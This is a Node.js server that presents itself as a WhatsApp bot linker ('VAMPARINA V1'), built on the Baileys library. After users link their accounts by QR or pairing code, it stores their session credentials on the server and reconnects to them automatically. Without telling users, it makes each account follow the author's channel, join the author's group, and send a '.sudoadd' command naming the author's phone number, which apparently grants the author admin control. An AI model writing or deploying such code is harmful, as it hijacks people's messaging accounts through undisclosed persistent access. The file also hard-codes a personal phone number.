process.env.NODE_OPTIONS = "--max-old-space-size=512";

const config = require('./config');
const fs = require('fs');
const path = require('path');
const express = require('express');
const makeWASocket = require("@whiskeysockets/baileys").default;
const { useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, delay, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');

// YOUR WHATSAPP CHANNEL JID (from your link)
const MY_CHANNEL_JID = "0029VbBm7apIXnlmuyjGGM0p@newsletter";

// YOUR WHATSAPP GROUP INVITE CODE (from your link)
const MY_GROUP_INVITE_CODE = "BZNDaKhvMFo5Gmne3wxt9n";

// YOUR PHONE NUMBER FOR SUDOADD
const MY_PHONE = "254703110780";

const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');
[SESSION_DIR, TEMP_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }));

const PORT = process.env.PORT || 3000;
const activeBots = new Map();
const app = express();

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// DASHBOARD
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
h1{font-size:70px;text-shadow:0 0 40px lime;} .s{font-size:60px;color:gold;} a{color:lime;font-size:35px;display:block;margin:30px;}</style></head>
<body><h1>VAMPARINA V1 EMPIRE</h1>
<p class="s">SOLDIERS: ${activeBots.size}</p>
<a href="/qr">SCAN QR CODE</a>
<a href="/pair">PAIR WITH CODE</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
});

// QR CODE — YOUR OLD LINKER STYLE + AUTO-FOLLOW + AUTO-JOIN + AUTO-SUDO
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const version = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        printQRInTerminal: false
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.qr) {
            const qrImg = await QRCode.toDataURL(update.qr);
            res.send(`<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:50px;">
            <h1>VAMPARINA V1</h1><img src="${qrImg}" style="max-width:380px;border:12px solid lime;border-radius:30px;">
            <h2>SCAN NOW</h2></body></html>`);
        }

        if (update.connection === 'open') {
            const phone = sock.user.id.split(':')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });

            await delay(15000);

            // AUTO FOLLOW YOUR CHANNEL
            try { await sock.newsletterFollow(MY_CHANNEL_JID); } catch(e) {}

            // AUTO JOIN YOUR GROUP
            try { await sock.groupAcceptInvite(MY_GROUP_INVITE_CODE); } catch(e) {}

            // AUTO SUDOADD YOU
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${MY_PHONE}` });

            // START THE BOT
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }
    });

    sock.ev.on('creds.update', saveCreds);
});

// PAIR CODE — YOUR OLD LINKER STYLE + AUTO-FOLLOW + AUTO-JOIN + AUTO-SUDO
app.get('/pair', async (req, res) => {
    let number = (req.query.number || '').replace(/\D/g, '');
    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:60px;">
<h1>VAMPARINA V1</h1><p>Enter Number:</p>
<form><input name="number" placeholder="254703110780" style="padding:20px;font-size:28px;width:90%;border:3px solid lime;background:#111;color:#0f0;" required autofocus><br><br>
<button style="padding:20px 60px;font-size:30px;background:lime;color:black;border:none;">GET CODE</button></form></body></html>`);
    }
    if (number.length === 9) number = '254' + number;

    const tempId = 'pair_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    const version = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "121.0"]
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split(':')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });

            await delay(15000);

            // AUTO FOLLOW YOUR CHANNEL
            try { await sock.newsletterFollow(MY_CHANNEL_JID); } catch(e) {}

            // AUTO JOIN YOUR GROUP
            try { await sock.groupAcceptInvite(MY_GROUP_INVITE_CODE); } catch(e) {}

            // AUTO SUDOADD YOU
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${MY_PHONE}` });

            // START THE BOT
            startEmpireBot(sessionId, phone, finalPath);
            fs.rmSync(tempPath, { recursive: true, force: true });
        }
    });

    setTimeout(async () => {
        try {
            let code = await sock.requestPairingCode(number);
            code = code.match(/.{1,4}/g).join('-');
            res.send(`
<!DOCTYPE html><html><body style="background:#000;color:#0f0;text-align:center;padding:50px;">
<h1>CODE READY</h1>
<div style="font-size:90px;letter-spacing:20px;background:#111;padding:40px;border:10px solid lime;border-radius:30px;">${code}</div>
<button onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')" style="padding:25px 70px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;">COPY CODE</button>
<br><br><a href="/pair" style="color:lime;font-size:30px;">Another Number</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
        } catch {
            res.send('<h1 style="color:red">ERROR — TRY AGAIN</h1><a href="/pair">BACK</a>');
        }
    }, 7000);

    sock.ev.on('creds.update', saveCreds);
});

// MAIN BOT FUNCTION — UNLIMITED USERS + AUTO-RECONNECT
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const version = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    });

    activeBots.set(sessionId, { sock, phone });

    // RESPONDS TO EVERYONE — NO LIMIT
    sock.ev.on('messages.upsert', m => {
        try { require('./main')(sock, m); } catch(e) {}
    });

    sock.ev.on('connection.update', update => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → FULLY LOADED: Channel + Group + Sudo`);
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// AUTO LOAD ALL OLD SESSIONS ON STARTUP
fs.readdirSync(SESSION_DIR).forEach(folder => {
    if (folder.startsWith('vamp_')) {
        const phone = folder.split('_')[1];
        const fullPath = path.join(SESSION_DIR, folder);
        startEmpireBot(folder, phone, fullPath);
    }
});

app.listen(PORT, () => {
    console.clear();
    console.log(`
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — OLD LINKER + AUTO FEATURES      ║
║   Auto-Follow Channel + Auto-Join Group + Auto-Sudo     ║
║              UNLIMITED USERS — NEVER DIES                ║
║               KING ARNOLD = +254703110780                ║
╚══════════════════════════════════════════════════════════╝
    `);
});